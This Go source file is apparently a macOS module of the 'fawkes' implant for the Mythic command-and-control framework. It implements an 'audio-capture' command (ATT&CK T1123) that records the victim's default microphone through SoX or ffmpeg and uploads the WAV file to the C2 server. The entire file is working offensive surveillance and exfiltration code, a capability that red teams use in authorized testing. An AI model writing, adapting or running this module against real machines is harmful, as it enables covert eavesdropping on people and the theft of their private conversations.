//go:build darwin

package commands

import (
	"encoding/json"
	"fmt"
	"os/exec"
	"strconv"
	"time"

	"fawkes/pkg/structs"
)

type AudioCaptureCommand struct{}

func (c *AudioCaptureCommand) Name() string        { return "audio-capture" }
func (c *AudioCaptureCommand) Description() string { return "Record audio from microphone (T1123)" }

func (c *AudioCaptureCommand) Execute(task structs.Task) structs.CommandResult {
	var params audioCaptureParams
	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
		return errorf("Error parsing parameters: %v", err)
	}
	audioDefaultParams(&params)

	bitsPerSample := 16

	// macOS: Use the built-in `rec` command from SoX if available,
	// otherwise fall back to `ffmpeg` which is commonly installed via Homebrew.
	// Both can capture from the default audio input device.
	startTime := time.Now()
	var wavData []byte

	// Try sox/rec first (outputs WAV directly to stdout)
	recArgs := []string{
		"-q",        // quiet
		"-d",        // default device
		"-t", "wav", // WAV output
		"-r", strconv.Itoa(params.SampleRate),
		"-c", strconv.Itoa(params.Channels),
		"-b", strconv.Itoa(bitsPerSample),
		"-", // stdout
		"trim", "0", strconv.Itoa(params.Duration),
	}
	cmd := exec.Command("rec", recArgs...)
	output, err := audioRunWithTimeoutDarwin(cmd, task, params.Duration+5)
	if err == nil && len(output) > 44 {
		wavData = output
	}

	// Fallback: try ffmpeg
	if wavData == nil {
		ffmpegArgs := []string{
			"-f", "avfoundation",
			"-i", ":0", // default audio input
			"-t", strconv.Itoa(params.Duration),
			"-ar", strconv.Itoa(params.SampleRate),
			"-ac", strconv.Itoa(params.Channels),
			"-sample_fmt", "s16",
			"-f", "wav",
			"-y",     // overwrite
			"pipe:1", // output to stdout
		}
		ffCmd := exec.Command("ffmpeg", ffmpegArgs...)
		ffOutput, ffErr := audioRunWithTimeoutDarwin(ffCmd, task, params.Duration+10)
		if ffErr == nil && len(ffOutput) > 44 {
			wavData = ffOutput
		} else {
			errMsg := "Audio capture failed."
			if err != nil {
				errMsg += fmt.Sprintf(" rec: %v.", err)
			}
			if ffErr != nil {
				errMsg += fmt.Sprintf(" ffmpeg: %v.", ffErr)
			}
			errMsg += " Install SoX (brew install sox) or ffmpeg (brew install ffmpeg)."
			return errorf("%s", errMsg)
		}
	}

	if len(wavData) < 45 {
		return errorf("No audio data captured — check microphone permissions (TCC)")
	}

	// Upload WAV file to Mythic
	uploadMsg := structs.SendFileToMythicStruct{}
	uploadMsg.Task = &task
	uploadMsg.IsScreenshot = false
	uploadMsg.SendUserStatusUpdates = false
	uploadMsg.Data = &wavData
	uploadMsg.FileName = fmt.Sprintf("audio_capture_%s.wav", time.Now().Format("20060102_150405"))
	uploadMsg.FullPath = ""
	uploadMsg.FinishedTransfer = make(chan int, 2)

	task.Job.SendFileToMythic <- uploadMsg

	for {
		select {
		case <-uploadMsg.FinishedTransfer:
			result := audioCaptureResult{
				Duration:    time.Since(startTime).Truncate(time.Second).String(),
				SampleRate:  params.SampleRate,
				Channels:    params.Channels,
				BitsPerSamp: bitsPerSample,
				DataSize:    len(wavData),
				DeviceUsed:  "default",
			}
			output, _ := json.Marshal(result)
			return successResult(string(output))
		case <-time.After(1 * time.Second):
			if task.DidStop() {
				return errorResult("Audio capture upload cancelled")
			}
		}
	}
}

func audioRunWithTimeoutDarwin(cmd *exec.Cmd, task structs.Task, timeoutSecs int) ([]byte, error) {
	done := make(chan struct{})
	var output []byte
	var cmdErr error

	go func() {
		output, cmdErr = cmd.Output()
		close(done)
	}()

	deadline := time.After(time.Duration(timeoutSecs) * time.Second)
	for {
		select {
		case <-done:
			return output, cmdErr
		case <-deadline:
			if cmd.Process != nil {
				_ = cmd.Process.Kill()
			}
			return output, fmt.Errorf("timeout after %ds", timeoutSecs)
		case <-time.After(500 * time.Millisecond):
			if task.DidStop() {
				if cmd.Process != nil {
					_ = cmd.Process.Kill()
				}
				return nil, fmt.Errorf("task cancelled")
			}
		}
	}
}
